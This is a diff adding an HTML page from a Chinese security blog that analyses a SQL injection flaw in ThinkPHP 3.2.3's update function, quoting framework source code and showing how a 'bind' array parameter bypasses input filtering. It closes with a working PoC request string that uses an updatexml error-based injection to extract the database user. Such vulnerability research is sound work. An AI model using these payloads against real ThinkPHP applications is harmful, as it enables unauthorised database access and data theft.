@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphp 3.2.3 update注入漏洞一、漏洞简介thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Thinkphp 3.2.3 update注入漏洞一、漏洞简介thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.jpg">
+<meta property="article:published_time" content="2022-07-08T06:26:04.464Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_update注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.464Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-3-2-3-update注入漏洞"><a href="#Thinkphp-3-2-3-update注入漏洞" class="headerlink" title="Thinkphp 3.2.3 update注入漏洞"></a>Thinkphp 3.2.3 update注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>&lt;= 3.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个问题很早之前就注意到了，只是一直没找到更常规的写法去导致注入的产生，在挖掘框架漏洞的标准是在使用官方的标准开发方式的前提下也会产生可以用的漏洞，这样才算框架级漏洞，跟普通的业务代码漏洞是有严格界线的。</p>
+<p>thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter</p>
+<pre><code>function think_filter(&amp;$value)&#123;
+    if(preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;,$value))
+</code></pre>
+<p>有没有相关tips来达到I函数绕过呢？是可以的。</p>
+<p><a target="_blank" rel="noopener" href="http://document.thinkphp.cn/manual_3_2.html#update_data">http://document.thinkphp.cn/manual_3_2.html#update_data</a></p>
+<p>一般按照官方的写法，thinkphp提供了数据库链式操作，其中包含连贯操作和curd操作，在进行数据库CURD操作去更新数据的时候：<br>举例update数据操作。</p>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.jpg"></p>
+<p>where制定主键的数值，save方法去更新变量传进来的参数到数据库的指定位置。</p>
+<pre><code>public function where($where,$parse=null)&#123;
+        if(!is_null($parse) &amp;&amp; is_string($where)) &#123;
+            if(!is_array($parse)) &#123;
+                $parse = func_get_args();
+                array_shift($parse);
+            &#125;
+            $parse = array_map(array($this-&gt;db,&#39;escapeString&#39;),$parse);
+            $where =   vsprintf($where,$parse);
+        &#125;elseif(is_object($where))&#123;
+            $where  =   get_object_vars($where);
+        &#125;
+        if(is_string($where) &amp;&amp; &#39;&#39; != $where)&#123;
+            $map    =   array();
+            $map[&#39;_string&#39;]   =   $where;
+            $where  =   $map;
+        &#125;        
+        if(isset($this-&gt;options[&#39;where&#39;]))&#123;
+            $this-&gt;options[&#39;where&#39;] =   array_merge($this-&gt;options[&#39;where&#39;],$where);
+        &#125;else&#123;
+            $this-&gt;options[&#39;where&#39;] =   $where;
+        &#125;
+
+        return $this;
+    &#125;
+</code></pre>
+<p>通过where方法获取where()链式中进来的参数值，并对参数进行检查，是否为字符串，tp框架默认是对字符串进行过滤的</p>
+<pre><code>public function save($data=&#39;&#39;,$options=array()) &#123;
+        if(empty($data)) &#123;
+            // 没有传递数据，获取当前数据对象的值
+            if(!empty($this-&gt;data)) &#123;
+                $data           =   $this-&gt;data;
+                // 重置数据
+                $this-&gt;data     =   array();
+            &#125;else&#123;
+                $this-&gt;error    =   L(&#39;_DATA_TYPE_INVALID_&#39;);
+                return false;
+            &#125;
+        &#125;
+        // 数据处理
+        $data       =   $this-&gt;_facade($data);
+        if(empty($data))&#123;
+            // 没有数据则不执行
+            $this-&gt;error    =   L(&#39;_DATA_TYPE_INVALID_&#39;);
+            return false;
+        &#125;
+        // 分析表达式
+        $options    =   $this-&gt;_parseOptions($options);
+        $pk         =   $this-&gt;getPk();
+        if(!isset($options[&#39;where&#39;]) ) &#123;
+            // 如果存在主键数据 则自动作为更新条件
+            if (is_string($pk) &amp;&amp; isset($data[$pk])) &#123;
+                $where[$pk]     =   $data[$pk];
+                unset($data[$pk]);
+            &#125; elseif (is_array($pk)) &#123;
+                // 增加复合主键支持
+                foreach ($pk as $field) &#123;
+                    if(isset($data[$field])) &#123;
+                        $where[$field]      =   $data[$field];
+                    &#125; else &#123;
+                           // 如果缺少复合主键数据则不执行
+                        $this-&gt;error        =   L(&#39;_OPERATION_WRONG_&#39;);
+                        return false;
+                    &#125;
+                    unset($data[$field]);
+                &#125;
+            &#125;
+            if(!isset($where))&#123;
+                // 如果没有任何更新条件则不执行
+                $this-&gt;error        =   L(&#39;_OPERATION_WRONG_&#39;);
+                return false;
+            &#125;else&#123;
+                $options[&#39;where&#39;]   =   $where;
+            &#125;
+        &#125;
+
+        if(is_array($options[&#39;where&#39;]) &amp;&amp; isset($options[&#39;where&#39;][$pk]))&#123;
+            $pkValue    =   $options[&#39;where&#39;][$pk];
+        &#125;
+        if(false === $this-&gt;_before_update($data,$options)) &#123;
+            return false;
+        &#125;
+        $result     =   $this-&gt;db-&gt;update($data,$options);
+        if(false !== $result &amp;&amp; is_numeric($result)) &#123;
+            if(isset($pkValue)) $data[$pk]   =  $pkValue;
+            $this-&gt;_after_update($data,$options);
+        &#125;
+        return $result;
+    &#125;
+</code></pre>
+<p>再来到save方法，通过前面的数据处理解析服务端数据库中的数据字段信息，字段数据类型，再到_parseOptions表达式分析，获取到表名，数据表别名，记录操作的模型名称，再去调用回调函数进入update</p>
+<p>我们这里先直接看框架的where子单元函数，之前网上公开的exp表达式注入就是从这里分析出来的结论：</p>
+<p>Thinkphp/Library/Think/Db/Driver.class.php</p>
+<pre><code>// where子单元分析
+    protected function parseWhereItem($key,$val) &#123;
+        $whereStr = &#39;&#39;;
+        if(is_array($val)) &#123;
+            if(is_string($val[0])) &#123;
+                $exp    =    strtolower($val[0]);
+                if(preg_match(&#39;/^(eq|neq|gt|egt|lt|elt)$/&#39;,$exp)) &#123; // 比较运算
+                    $whereStr .= $key.&#39; &#39;.$this-&gt;exp[$exp].&#39; &#39;.$this-&gt;parseValue($val[1]);
+                &#125;elseif(preg_match(&#39;/^(notlike|like)$/&#39;,$exp))&#123;// 模糊查找
+                    if(is_array($val[1])) &#123;
+                        $likeLogic  =   isset($val[2])?strtoupper($val[2]):&#39;OR&#39;;
+                        if(in_array($likeLogic,array(&#39;AND&#39;,&#39;OR&#39;,&#39;XOR&#39;)))&#123;
+                            $like       =   array();
+                            foreach ($val[1] as $item)&#123;
+                                $like[] = $key.&#39; &#39;.$this-&gt;exp[$exp].&#39; &#39;.$this-&gt;parseValue($item);
+                            &#125;
+                            $whereStr .= &#39;(&#39;.implode(&#39; &#39;.$likeLogic.&#39; &#39;,$like).&#39;)&#39;;                          
+                        &#125;
+                    &#125;else&#123;
+                        $whereStr .= $key.&#39; &#39;.$this-&gt;exp[$exp].&#39; &#39;.$this-&gt;parseValue($val[1]);
+                    &#125;
+                &#125;elseif(&#39;bind&#39; == $exp )&#123; // 使用表达式
+                    $whereStr .= $key.&#39; = :&#39;.$val[1];
+                &#125;elseif(&#39;exp&#39; == $exp )&#123; // 使用表达式
+                    $whereStr .= $key.&#39; &#39;.$val[1];
+                &#125;elseif(preg_match(&#39;/^(notin|not in|in)$/&#39;,$exp))&#123; // IN 运算
+                    if(isset($val[2]) &amp;&amp; &#39;exp&#39;==$val[2]) &#123;
+                        $whereStr .= $key.&#39; &#39;.$this-&gt;exp[$exp].&#39; &#39;.$val[1];
+                    &#125;else&#123;
+                        if(is_string($val[1])) &#123;
+                             $val[1] =  explode(&#39;,&#39;,$val[1]);
+                        &#125;
+                        $zone      =   implode(&#39;,&#39;,$this-&gt;parseValue($val[1]));
+                        $whereStr .= $key.&#39; &#39;.$this-&gt;exp[$exp].&#39; (&#39;.$zone.&#39;)&#39;;
+                    &#125;
+                &#125;elseif(preg_match(&#39;/^(notbetween|not between|between)$/&#39;,$exp))&#123; // BETWEEN运算
+                    $data = is_string($val[1])? explode(&#39;,&#39;,$val[1]):$val[1];
+                    $whereStr .=  $key.&#39; &#39;.$this-&gt;exp[$exp].&#39; &#39;.$this-&gt;parseValue($data[0]).&#39; AND &#39;.$this-&gt;parseValue($data[1]);
+                &#125;else&#123;
+                    E(L(&#39;_EXPRESS_ERROR_&#39;).&#39;:&#39;.$val[0]);
+                &#125;
+            &#125;else &#123;
+                $count = count($val);
+                $rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : &#39;&#39; ; 
+                if(in_array($rule,array(&#39;AND&#39;,&#39;OR&#39;,&#39;XOR&#39;))) &#123;
+                    $count  = $count -1;
+                &#125;else&#123;
+                    $rule   = &#39;AND&#39;;
+                &#125;
+                for($i=0;$i&lt;$count;$i++) &#123;
+                    $data = is_array($val[$i])?$val[$i][1]:$val[$i];
+                    if(&#39;exp&#39;==strtolower($val[$i][0])) &#123;
+                        $whereStr .= $key.&#39; &#39;.$data.&#39; &#39;.$rule.&#39; &#39;;
+                    &#125;else&#123;
+                        $whereStr .= $this-&gt;parseWhereItem($key,$val[$i]).&#39; &#39;.$rule.&#39; &#39;;
+                    &#125;
+                &#125;
+                $whereStr = &#39;( &#39;.substr($whereStr,0,-4).&#39; )&#39;;
+            &#125;
+        &#125;else &#123;
+            //对字符串类型字段采用模糊匹配
+            $likeFields   =   $this-&gt;config[&#39;db_like_fields&#39;];
+            if($likeFields &amp;&amp; preg_match(&#39;/^(&#39;.$likeFields.&#39;)$/i&#39;,$key)) &#123;
+                $whereStr .= $key.&#39; LIKE &#39;.$this-&gt;parseValue(&#39;%&#39;.$val.&#39;%&#39;);
+            &#125;else &#123;
+                $whereStr .= $key.&#39; = &#39;.$this-&gt;parseValue($val);
+            &#125;
+        &#125;
+        return $whereStr;
+    &#125;
+</code></pre>
+<p>其中除了exp能利用外还有一处bind，而bind可以完美避开了think_filter：</p>
+<pre><code>elseif(&#39;bind&#39; == $exp )&#123; // 使用表达式
+                    $whereStr .= $key.&#39; = :&#39;.$val[1];
+                &#125;elseif(&#39;exp&#39; == $exp )&#123; // 使用表达式
+                    $whereStr .= $key.&#39; &#39;.$val[1];
+</code></pre>
+<p>这里由于拼接了$val参数的形式造成了注入，但是这里的bind表达式会引入:符号参数绑定的形式去拼接数据，通过白盒对几处CURD操作函数进行分析定位到update函数，insert函数会造成sql注入，于是回到上面的updateh函数。<br>Thinkphp/Library/Think/Db/Driver.class.php</p>
+<pre><code>/**
+     * 更新记录
+     * @access public
+     * @param mixed $data 数据
+     * @param array $options 表达式
+     * @return false | integer
+     */
+    public function update($data,$options) &#123;
+        $this-&gt;model  =   $options[&#39;model&#39;];
+        $this-&gt;parseBind(!empty($options[&#39;bind&#39;])?$options[&#39;bind&#39;]:array());
+        $table  =   $this-&gt;parseTable($options[&#39;table&#39;]);
+        $sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);
+        if(strpos($table,&#39;,&#39;))&#123;// 多表更新支持JOIN操作
+            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;])?$options[&#39;join&#39;]:&#39;&#39;);
+        &#125;
+        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;])?$options[&#39;where&#39;]:&#39;&#39;);
+        if(!strpos($table,&#39;,&#39;))&#123;
+            //  单表更新支持order和lmit
+            $sql   .=  $this-&gt;parseOrder(!empty($options[&#39;order&#39;])?$options[&#39;order&#39;]:&#39;&#39;)
+                .$this-&gt;parseLimit(!empty($options[&#39;limit&#39;])?$options[&#39;limit&#39;]:&#39;&#39;);
+        &#125;
+        $sql .=   $this-&gt;parseComment(!empty($options[&#39;comment&#39;])?$options[&#39;comment&#39;]:&#39;&#39;);
+        return $this-&gt;execute($sql,!empty($options[&#39;fetch_sql&#39;]) ? true : false);
+    &#125;
+</code></pre>
+<p>跟进execute函数：</p>
+<pre><code>public function execute($str,$fetchSql=false) &#123;
+        $this-&gt;initConnect(true);
+        if ( !$this-&gt;_linkID ) return false;
+        $this-&gt;queryStr = $str;
+        if(!empty($this-&gt;bind))&#123;
+            $that   =   $this;
+            $this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that)&#123; return &#39;&#39;&#39;.$that-&gt;escapeString($val).&#39;&#39;&#39;; &#125;,$this-&gt;bind));
+        &#125;
+        if($fetchSql)&#123;
+            return $this-&gt;queryStr;
+        &#125;
+</code></pre>
+<p>这里有处对$this-&gt;queryStr进行字符替换的操作：</p>
+<pre><code>$this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that)&#123; return &#39;&#39;&#39;.$that-&gt;escapeString($val).&#39;&#39;&#39;; &#125;,$this-&gt;bind));
+</code></pre>
+<p>具体是什么，我这里写了一个实例：</p>
+<p>常规的跟新数据库用户信息的操作：</p>
+<p>Application/Home/Controller/UserController.class.php</p>
+<pre><code>&lt;?php
+
+namespace HomeController;
+use ThinkController;
+
+class UserController extends Controller &#123;
+
+    public function index()&#123;
+
+        $User = M(&quot;member&quot;);
+        $user[&#39;id&#39;] = I(&#39;id&#39;);
+        $data[&#39;money&#39;] = I(&#39;money&#39;);
+        $data[&#39;user&#39;] = I(&#39;user&#39;);
+        $valu = $User-&gt;where($user)-&gt;save($data);
+        var_dump($valu);
+    &#125;
+&#125;
+</code></pre>
+<p>根据进来的id更新用户的名字和钱，构造一个简单一个poc</p>
+<p>id[]=bind&amp;id[]=1’&amp;money[]=1123&amp;user=liao<br>当走到execute函数时sql语句为：</p>
+<pre><code>UPDATE `member` SET `user`=:0 WHERE `id` = :1&#39;
+</code></pre>
+<p>然后$that = $this</p>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.jpg"></p>
+<p>然后下面的替换操作是将”:0”替换为外部传进来的字符串，这里就可控了。</p>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.jpg"></p>
+<p>替换后：</p>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.jpg"></p>
+<p>明显发现之前的<code>user</code>参数为:0然后被替换为了liao，这样就把:替换掉了。<br>后面的:1明显是替换不掉的：</p>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.jpg"></p>
+<p>那么我们将id[1]数组的参数变为0呢？</p>
+<pre><code>id[]=bind&amp;id[]=0%27&amp;money[]=1123&amp;user=liao
+</code></pre>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.jpg"></p>
+<p>果然造成了注入：</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>money[]=1123&amp;user=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
+</code></pre>
+<p><img src="/resource/Thinkphp3.2.3update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.jpg"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwh500hky8v1d8o98dhf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
